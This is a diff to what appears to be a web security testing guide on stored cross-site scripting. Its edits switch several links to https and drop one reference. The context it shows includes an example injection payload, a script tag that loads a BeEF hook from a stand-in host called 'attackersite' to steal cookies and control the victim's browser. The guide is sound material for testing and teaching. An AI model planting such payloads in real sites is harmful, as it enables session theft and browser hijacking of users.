@@ -26,7 +26,7 @@ Stored XSS does not need a malicious link to be exploited. A successful exploita
 - User visits vulnerable page
 - Malicious code is executed by the user's browser
 
-This type of attack can also be exploited with browser exploitation frameworks such as [BeEF](https://beefproject.com) and [XSS Proxy](http://xss-proxy.sourceforge.net/). These frameworks allow for complex JavaScript exploit development.
+This type of attack can also be exploited with browser exploitation frameworks such as [BeEF](https://beefproject.com) and [XSS Proxy](https://xss-proxy.sourceforge.net/). These frameworks allow for complex JavaScript exploit development.
 
 Stored XSS is particularly dangerous in application areas where users with high privileges have access. When the administrator visits the vulnerable page, the attack is automatically executed by their browser. This might expose sensitive information such as session authorization tokens.
 
@@ -98,7 +98,7 @@ Ensure the input is submitted through the application. This normally involves di
 
 #### Leverage Stored XSS with BeEF
 
-Stored XSS can be exploited by advanced JavaScript exploitation frameworks such as [BeEF](https://www.beefproject.com) and [XSS Proxy](http://xss-proxy.sourceforge.net/).
+Stored XSS can be exploited by advanced JavaScript exploitation frameworks such as [BeEF](https://www.beefproject.com) and [XSS Proxy](https://xss-proxy.sourceforge.net/).
 
 A typical BeEF exploitation scenario involves:
 
@@ -111,7 +111,7 @@ The JavaScript hook can be injected by exploiting the XSS vulnerability in the w
 **Example**: BeEF Injection in `index2.php`:
 
 ```html
-aaa@aa.com"><script src=http://attackersite/hook.js></script>
+aaa@aa.com"><script src=https://attackersite/hook.js></script>
 ```
 
 When the user loads the page `index2.php`, the script `hook.js` is executed by the browser. It is then possible to access cookies, user screenshot, user clipboard, and launch complex XSS attacks.
@@ -185,7 +185,7 @@ The following table summarizes some special variables and functions to look at w
 - [PHP Charset Encoder(PCE)](https://cybersecurity.wtf/encoder/) helps you encode arbitrary texts to and from 65 kinds of character sets that you can use in your customized payloads.
 - [Hackvertor](https://hackvertor.co.uk/public) is an online tool which allows many types of encoding and obfuscation of JavaScript (or any string input).
 - [BeEF](https://www.beefproject.com) is the browser exploitation framework. A professional tool to demonstrate the real-time impact of browser vulnerabilities.
-- [XSS-Proxy](http://xss-proxy.sourceforge.net/) is an advanced Cross-Site-Scripting (XSS) attack tool.
+- [XSS-Proxy](https://xss-proxy.sourceforge.net/) is an advanced Cross-Site-Scripting (XSS) attack tool.
 - [Burp Proxy](https://portswigger.net/burp/) is an interactive HTTP/S proxy server for attacking and testing web applications.
 - [XSS Assistant](https://www.greasespot.net/) Greasemonkey script that allow users to easily test any web application for cross-site-scripting flaws.
 - [Zed Attack Proxy (ZAP)](https://www.zaproxy.org) is an interactive HTTP/S proxy server for attacking and testing web applications with a built-in scanner.
@@ -207,5 +207,4 @@ The following table summarizes some special variables and functions to look at w
 
 - [CERT: "CERT Advisory CA-2000-02 Malicious HTML Tags Embedded in Client Web Requests"](https://resources.sei.cmu.edu/library/asset-view.cfm?assetID=496186)
 - [Amit Klein: "Cross-site Scripting Explained"](https://courses.csail.mit.edu/6.857/2009/handouts/css-explained.pdf)
-- [Gunter Ollmann: "HTML Code Injection and Cross-site Scripting"](http://www.technicalinfo.net/papers/CSS.html)
 - [CGISecurity.com: "The Cross Site Scripting FAQ"](https://www.cgisecurity.com/xss-faq.html)
